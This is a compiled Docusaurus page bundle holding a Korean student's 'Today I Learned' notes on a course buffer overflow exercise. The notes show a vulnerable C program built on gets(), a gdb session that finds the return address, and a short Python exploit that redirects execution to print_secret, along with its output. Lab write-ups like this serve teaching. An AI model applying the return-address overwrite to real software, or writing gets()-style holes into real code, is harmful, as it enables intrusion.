"use strict";(self.webpackChunkdogsounds_til=self.webpackChunkdogsounds_til||[]).push([[2801],{7942:(e,n,t)=>{t.d(n,{Zo:()=>f,kt:()=>m});var r=t(959);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function p(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?p(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):p(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},p=Object.keys(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var p=Object.getOwnPropertySymbols(e);for(r=0;r<p.length;r++)t=p[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),s=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},f=function(e){var n=s(e.components);return r.createElement(l.Provider,{value:n},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},c=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,p=e.originalType,l=e.parentName,f=i(e,["components","mdxType","originalType","parentName"]),u=s(t),c=o,m=u["".concat(l,".").concat(c)]||u[c]||d[c]||p;return t?r.createElement(m,a(a({ref:n},f),{},{components:t})):r.createElement(m,a({ref:n},f))}));function m(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var p=t.length,a=new Array(p);a[0]=c;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[u]="string"==typeof e?e:o,a[1]=i;for(var s=2;s<p;s++)a[s]=t[s];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}c.displayName="MDXCreateElement"},7326:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>d,frontMatter:()=>p,metadata:()=>i,toc:()=>s});var r=t(1966),o=(t(959),t(7942));const p={id:"19-\uae08"},a="23.05.19.",i={unversionedId:"\uc1a1\uc740\uc218/23.05/19-\uae08",id:"\uc1a1\uc740\uc218/23.05/19-\uae08",title:"23.05.19.",description:"- \ucef4\uc2dc\uac1c",source:"@site/docs/\uc1a1\uc740\uc218/23.05/19 (\uae08).md",sourceDirName:"\uc1a1\uc740\uc218/23.05",slug:"/\uc1a1\uc740\uc218/23.05/19-\uae08",permalink:"/Dogsounds-TIL/TIL/\uc1a1\uc740\uc218/23.05/19-\uae08",draft:!1,tags:[],version:"current",frontMatter:{id:"19-\uae08"},sidebar:"tutorialSidebar",previous:{title:"23.05.18.",permalink:"/Dogsounds-TIL/TIL/\uc1a1\uc740\uc218/23.05/18-\ubaa9"},next:{title:"23.05.22.",permalink:"/Dogsounds-TIL/TIL/\uc1a1\uc740\uc218/23.05/22-\uc6d4"}},l={},s=[{value:"\ucef4\ud4e8\ud130\uc2dc\uc2a4\ud15c\uac1c\ub860",id:"\ucef4\ud4e8\ud130\uc2dc\uc2a4\ud15c\uac1c\ub860",level:2},{value:"Buffer Overflow Exploitation",id:"buffer-overflow-exploitation",level:3}],f={toc:s},u="wrapper";function d(e){let{components:n,...t}=e;return(0,o.kt)(u,(0,r.Z)({},f,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"230519"},"23.05.19."),(0,o.kt)("h1",{id:"today-i-learned"},"Today I learned"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"\ucef4\uc2dc\uac1c")),(0,o.kt)("h2",{id:"\ucef4\ud4e8\ud130\uc2dc\uc2a4\ud15c\uac1c\ub860"},"\ucef4\ud4e8\ud130\uc2dc\uc2a4\ud15c\uac1c\ub860"),(0,o.kt)("h3",{id:"buffer-overflow-exploitation"},"Buffer Overflow Exploitation"),(0,o.kt)("p",null,"\uc624\ubc84\ud50c\ub85c\uc6b0\ub97c \ubc1c\uc0dd\uc2dc\ucf1c \ubc18\ud658\uc8fc\uc18c \ubcc0\ud658\uc2dc\ud0a4\uae30"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-C"},'//myecho\n#include <stdio.h>\n\nvoid print_secret(void);\n\nvoid echo(void) {\n    char buf[24];\n    puts("Input your message:");\n    gets(buf);\n    puts(buf);\n}\n\nint main(void) {\n    echo();\n    return 0;\n}\n')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-python"},'//exe.py\nimport os, sys\nparent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nsys.path.append(parent_dir)\nfrom helper import Program\n\ndef exploit():\n    prog = Program("./myecho")\n    print(prog.read_line()) # Read the output of the program\n    prog.send_line("A"*40+"\\x86\\x06\\x40") # Send input to the program\n    print(prog.read_line())\n    print(prog.read_line())\n\nif __name__ == "__main__":\n    exploit()\n')),(0,o.kt)("p",null,"exe.py\ub97c \uc2e4\ud589\uc2dc\ucf1c bufferoverflow\ub97c \ubc1c\uc0dd\uc2dc\ucf1c secret.txt\ud30c\uc77c\uc744 \uc2e4\ud589\uc2dc\ucf1c\ubcf4\uc790."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cse20201593@cspro:~/assembly/hw2/2-1$ gdb -q myecho\nReading symbols from myecho...(no debugging symbols found)...done.\n(gdb) disas echo\nDump of assembler code for function echo:\n   0x00000000004006f3 <+0>: sub    $0x28,%rsp\n   0x00000000004006f7 <+4>: mov    $0x4007e8,%edi\n   0x00000000004006fc <+9>: callq  0x400510 <puts@plt>\n   0x0000000000400701 <+14>:    mov    %rsp,%rdi\n   0x0000000000400704 <+17>:    mov    $0x0,%eax\n   0x0000000000400709 <+22>:    callq  0x400550 <gets@plt>\n   0x000000000040070e <+27>:    mov    %rsp,%rdi\n   0x0000000000400711 <+30>:    callq  0x400510 <puts@plt>\n   0x0000000000400716 <+35>:    add    $0x28,%rsp\n   0x000000000040071a <+39>:    retq\nEnd of assembler dump.\n")),(0,o.kt)("p",null,"gdb\ub97c \uc2e4\ud589\uc2dc\ucf1c echo\ud30c\uc77c\uc744 \ub514\uc148\ube14 \ud574\ubcf8\ub2e4."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'(gdb) x/1s 0x4007e8\n0x4007e8:   "Input your message:"\n')),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"puts"),"\ub294 $0x4007e8 \ub808\uc9c0\uc2a4\ud130\uc5d0 \uc800\uc7a5\ub418\uc5b4\uc788\ub294 string\ubc30\uc5f4\uc744 \ubc1b\uc544 \ucd9c\ub825\ud55c\ub2e4.\noverflow\ub97c \ubc1c\uc0dd\uc2dc\ucf1c \ubc18\ud658\uc8fc\uc18c\ub97c \ubcc0\uacbd\ud558\uae30\uc704\ud574 ",(0,o.kt)("inlineCode",{parentName:"p"},"gets"),"\ub97c \ud0d0\uc0c9\ud55c\ub2e4."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(gdb) b * 0x400709\nBreakpoint 1 at 0x400709\n(gdb) r\nStarting program: /sogang/under/cse20201593/assembly/hw2/2-1/myecho\nInput your message:\n\nBreakpoint 1, 0x0000000000400709 in echo ()\n(gdb) x/8xg $rsp\n0x7fffffffe410: 0x0000000000000000  0x0000000000000000\n0x7fffffffe420: 0x0000000000400730  0x0000000000400590\n0x7fffffffe430: 0x00007fffffffe520  0x0000000000400724\n0x7fffffffe440: 0x0000000000000000  0x00007ffff7a2d840\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"gets"),"\ud568\uc218\uac00 \uc2e4\ud589\ub420\ub54c breakpoint\ub97c \uac78\uace0, \uc774\ub54c rsp\ub808\uc9c0\uc2a4\ud130\ub97c \uc5f4\uc5b4\ubcf8\ub2e4.",(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("inlineCode",{parentName:"p"},"0x00000000004006f3 <+0>:\tsub    $0x28,%rsp"),"\ub85c\ubd80\ud130 40\ubc14\uc774\ud2b8 \ub5a8\uc5b4\uc9c4 \uacf3\uc5d0 0x400724\uc778 \ubc18\ud658\uc8fc\uc18c\uac00 \uc704\uce58\ud55c\uac78 \uc54c \uc218 \uc788\ub2e4.\n\uc774 \uc8fc\uc18c\ub294 \uc5b4\ub514\ub97c \uac00\ub9ac\ud0ac\uae4c?"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(gdb) disas main\nDump of assembler code for function main:\n   0x000000000040071b <+0>: sub    $0x8,%rsp\n   0x000000000040071f <+4>: callq  0x4006f3 <echo>\n   0x0000000000400724 <+9>: mov    $0x0,%eax\n   0x0000000000400729 <+14>:    add    $0x8,%rsp\n   0x000000000040072d <+18>:    retq\nEnd of assembler dump.\n")),(0,o.kt)("p",null,"main\ud568\uc218\uc5d0\uc11c echo\ud568\uc218\ub97c \ud638\ucd9c\ud558\uace0 \uc800\uc7a5\ud55c returnaddress\uc784\uc744 \uc54c \uc218 \uc788\ub2e4.",(0,o.kt)("br",{parentName:"p"}),"\n","\uc6b0\ub9ac\ub294 \uc774 \uc8fc\uc18c\ub97c ",(0,o.kt)("inlineCode",{parentName:"p"},"print_secret()"),"\uc758 \uc8fc\uc18c\ub85c \ubc14\uafc0 \uc218 \uc788\ub2e4\uba74, secret.txt\ub97c \ud638\ucd9c\ud560 \uc218 \uc788\ub2e4.\n",(0,o.kt)("inlineCode",{parentName:"p"},"print_secret()"),"\uc758 \uc8fc\uc18c\ub97c \ucc3e\uc544\ubcf4\uba74"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(gdb) disas print_secret\nDump of assembler code for function print_secret:\n   0x0000000000400686 <+0>: sub    $0x58,%rsp\n")),(0,o.kt)("p",null,"\ub85c 0x400686\uc784\uc744 \uc54c\uc218\uc788\ub2e4.",(0,o.kt)("br",{parentName:"p"}),"\n",(0,o.kt)("inlineCode",{parentName:"p"},"gets"),"\ub294 $rsp\ub808\uc9c0\uc2a4\ud130\ub97c \uc778\uc790\ub85c \ubc1b\uc73c\ubbc0\ub85c, 40\ubc14\uc774\ud2b8 \ub354\ubbf8\uac12\uc744 \uc9d1\uc5b4\ub123\uace0 \uc774\ud6c4 ",(0,o.kt)("inlineCode",{parentName:"p"},"print_secret"),"\uc758 \uc8fc\uc18c\ub97c \uc368 \ub123\uc73c\uba74 echo\ub294 \uc2e4\ud589 \ud6c4 main\ud568\uc218\ub85c \ub3cc\uc544\uc624\uc9c0 \uc54a\uace0 ",(0,o.kt)("inlineCode",{parentName:"p"},"print_secret"),"\uc744 \ud638\ucd9c\ud55c\ub2e4."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'def exploit():\n    prog = Program("./myecho")\n    print(prog.read_line()) # Read the output of the program\n    prog.send_line("A"*40+"\\x86\\x06\\x40") # Send input to the program\n    print(prog.read_line())\n    print(prog.read_line())\n')),(0,o.kt)("p",null,"\ucd9c\ub825\uacb0\uacfc"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"cse20201593@cspro:~/assembly/hw2/2-1$ ./exploit-myecho.py\nInput your message:\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86@\nThe secret string is {8712f8ef}\n")))}d.isMDXComponent=!0}}]);